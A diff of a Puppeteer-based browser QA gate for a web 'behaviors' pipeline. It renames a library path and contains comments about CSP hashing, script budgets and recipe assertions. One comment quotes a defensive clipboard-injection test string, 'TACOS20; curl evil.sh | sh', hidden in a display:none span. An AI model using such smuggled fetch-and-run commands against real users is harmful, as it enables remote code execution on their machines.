@@ -21,9 +21,9 @@
 // hashes each inline <script> it finds in the SERIALIZED output. If that
 // hash ever drifts from the byte-identical script the browser actually
 // receives, Chrome silently refuses to run the script — every behavior dies
-// in production while every jsdom unit test in lib/behaviors/ stays green,
+// in production while every jsdom unit test in lib/conductas-heredadas/ stays green,
 // because jsdom never enforces CSP. Only a real browser hitting a real
-// served artifact can catch that. See lib/behaviors/registry.ts, build.ts,
+// served artifact can catch that. See lib/conductas-heredadas/registry.ts, build.ts,
 // and lib/publish/behaviors-sanitize-order.test.ts for the pipeline this
 // gate is the browser-truth capstone of.
 //
@@ -58,8 +58,8 @@ import { mkdtempSync, writeFileSync, readFileSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { createServer } from "node:http";
-import { BEHAVIORS, BEHAVIOR_ORDER } from "../../lib/behaviors/registry.ts";
-import { BEHAVIORS_SCRIPT_BUDGET_BYTES } from "../../lib/behaviors/build.ts";
+import { BEHAVIORS, BEHAVIOR_ORDER } from "../../lib/conductas-heredadas/registry.ts";
+import { BEHAVIORS_SCRIPT_BUDGET_BYTES } from "../../lib/conductas-heredadas/build.ts";
 
 // ── Catalog-coverage self-check — runs BEFORE Chrome/publish/network ───────
 // MARKERS (used further down by the static substring checks) is DERIVED from
@@ -70,7 +70,7 @@ import { BEHAVIORS_SCRIPT_BUDGET_BYTES } from "../../lib/behaviors/build.ts";
 // showing up in a substring check proves nothing about whether the recipe
 // works. Those interactions can't be generated generically (a generic "does
 // the marker's element exist" loop would not have caught a single one of the
-// regressions logged in lib/behaviors/conformance.test.ts's "aislamiento
+// regressions logged in lib/conductas-heredadas/conformance.test.ts's "aislamiento
 // entre recetas" comment), so they stay hand-written, one safeAssert per
 // behavior — which means nothing FORCES a new one to get written when
 // the next behavior is registered. BEHAVIOR_GATE_ASSERTIONS is that missing force:
@@ -99,7 +99,7 @@ const MARKERS = BEHAVIOR_ORDER.map((name) => BEHAVIORS[name].marker);
     const lines = ["GATE FAILED — el catalogo de conductas crecio pero este gate no lo siguio:"];
     for (const name of uncovered) {
       lines.push(
-        `  - se anadio "${name}" al registro (lib/behaviors/registry.ts / BEHAVIOR_ORDER) pero nadie escribio ` +
+        `  - se anadio "${name}" al registro (lib/conductas-heredadas/registry.ts / BEHAVIOR_ORDER) pero nadie escribio ` +
           `su asercion de navegador en scripts/qa/behaviors-born100-gate.mjs. Que hacer: (1) agrega el marcador ` +
           `de ejemplo de "${name}" a buildPage() en este archivo, (2) escribe un safeAssert(...) que la ejercite ` +
           `con Puppeteer real (click / scroll / leer estilo computado — nunca jsdom), (3) registra su numero de ` +
@@ -129,13 +129,13 @@ const SUB = "behaviors-gate";
 // templates. / R2 public bases only), so the real publish pipeline leaves
 // this <img> byte-untouched — no network fetch races publish. The lightbox
 // recipe's own runtime requires href to match /^https?:\/\//i (see
-// lib/behaviors/recipes/lightbox.ts), so it can't be a data: URI — a data:
+// lib/conductas-heredadas/recipes/lightbox.ts), so it can't be a data: URI — a data:
 // href would make the browser navigate away on click instead of opening the
 // modal, which is a different, wrong test.
 const PHOTO_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 220" width="320" height="220" role="img" aria-label="Tacos al pastor"><rect width="320" height="220" fill="#f97316"/><circle cx="160" cy="88" r="52" fill="#fde68a"/><text x="160" y="176" font-size="20" text-anchor="middle" font-family="sans-serif" font-weight="700" fill="#1f2937">Tacos al pastor</text></svg>`;
 
 // The gate page. Every markup fragment below is copied from each recipe's
-// `doc.example` in lib/behaviors/recipes/*.ts (source of truth per the
+// `doc.example` in lib/conductas-heredadas/recipes/*.ts (source of truth per the
 // task) — not invented. Real vertical scroll (>24px needed for sticky) via
 // the 1400px spacer; a real horizontal-overflow carousel for autoplay to
 // scroll; a creator <script> + onclick= to prove the sanitizer eats them.
@@ -467,14 +467,14 @@ if (behaviorsScriptBytes === null) {
 
 // Arreglo 6 (revisión final de rama): this used to only PRINT the weight —
 // a number nobody asserts is not a gate. BEHAVIORS_SCRIPT_BUDGET_BYTES is
-// imported from lib/behaviors/build.ts, the SAME constant
-// lib/behaviors/conformance.test.ts asserts against in jsdom, so the ceiling
+// imported from lib/conductas-heredadas/build.ts, the SAME constant
+// lib/conductas-heredadas/conformance.test.ts asserts against in jsdom, so the ceiling
 // can never diverge between the unit test and this end-to-end measurement
 // on a REAL published artifact.
 if (behaviorsScriptBytes !== null && behaviorsScriptBytes > BEHAVIORS_SCRIPT_BUDGET_BYTES) {
   staticFail.push(
     `behaviors script weight ${behaviorsScriptBytes}B exceeds the ${BEHAVIORS_SCRIPT_BUDGET_BYTES}B ceiling ` +
-      `(BEHAVIORS_SCRIPT_BUDGET_BYTES, lib/behaviors/build.ts — same ceiling conformance.test.ts asserts in jsdom)`,
+      `(BEHAVIORS_SCRIPT_BUDGET_BYTES, lib/conductas-heredadas/build.ts — same ceiling conformance.test.ts asserts in jsdom)`,
   );
 }
 
@@ -580,7 +580,7 @@ try {
 
   // The fixture's #cupon-verano carries a hidden `<span style="display:none">`
   // suffix (see buildPage() above) — jsdom can't tell display:none from
-  // visible (lib/behaviors/recipes/copy.test.ts covers the innerText/
+  // visible (lib/conductas-heredadas/recipes/copy.test.ts covers the innerText/
   // textContent fallback logic, not the exclusion itself), so THIS is the one
   // place that can prove it for real: clip must land as EXACTLY "TACOS20",
   // never "TACOS20; curl evil.sh | sh". Before the Arreglo 5 fix (copy.ts
